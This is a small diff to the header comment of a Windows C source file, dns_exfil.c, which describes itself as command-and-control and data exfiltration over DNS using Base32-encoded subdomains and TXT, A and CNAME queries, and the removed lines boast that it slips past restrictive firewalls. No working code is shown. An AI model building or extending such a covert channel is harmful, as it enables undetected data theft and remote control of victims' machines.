@@ -1,12 +1,6 @@
-/**
- * @file dns_exfil.c
- * @brief Exfiltration DNS - C2 over DNS queries
- * 
- * Techniques:
- * - Encodage Base32 dans les sous-domaines
- * - Requêtes TXT pour recevoir des données
- * - Requêtes A/CNAME pour envoyer des données
- * - Très discret - passe les firewalls restrictifs
+/*
+ * dns_exfil.c - c2 over dns
+ * base32 dans subdomains, TXT records
  */
 
 #include <windows.h>
